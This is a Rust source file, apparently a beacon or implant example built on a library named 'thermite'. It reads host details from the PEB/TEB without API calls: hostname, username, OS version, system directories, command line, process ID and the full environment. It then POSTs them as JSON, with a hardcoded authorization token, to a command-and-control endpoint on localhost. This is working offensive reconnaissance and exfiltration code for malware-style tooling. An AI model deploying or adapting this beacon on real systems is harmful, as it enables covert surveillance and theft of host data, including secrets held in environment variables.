#[allow(unused)]
use core::mem;
use reqwest::blocking::Client;
use serde::Serialize;
use thermite::enumeration::*;

#[derive(Serialize)]
pub struct BeaconData {
	pub hostname: String,
	pub username: String,
	pub version: (u32, u32, u32),
	pub tmpdir: String,
	pub appdata: String,
	pub windir: String,
	pub cwd: String,
	pub cmdline: String,
	pub pid: u64,
	pub env: Vec<String>,
}


fn main() -> Result<(), String> {
	// Retrieve system process info
	// let sys_proc_info_ptr = processes::get_process_info();

	// Enumerate all processes
	// let processes = processes::enumerate_processes(sys_proc_info_ptr).iter().map(|(_, _, proc_info_ptr)| unsafe {
	// 	Process::new(proc_info_ptr.cast_const())
	// }).collect();

	let (cmdline, cwd, env, osver) = unsafe { (get_command_line(), get_current_directory(), get_environment(), get_os_version()) };
	
	// All this information is gathered by reading the PEB/TEB, no API calls needed
	let data = BeaconData {
		hostname: get_computer_name(),
		username: get_username(),
		version: osver,
		tmpdir: get_temp(),
		appdata: get_appdata(),
		windir: get_windir(),
		cwd,
		cmdline,
		pid: get_process_id(),
		env,
	};

	let client = Client::new();
	let res =  client
		.post("http://localhost:3000/agent")
		.header("Authorization", "01912a94-2d2b-75f3-a024-149a9b56450b")
		.json(&data)
		.send().map_err(|e| e.to_string())?;
	println!("{:?}",res.text().map_err(|e| e.to_string())?);
	Ok(())

}


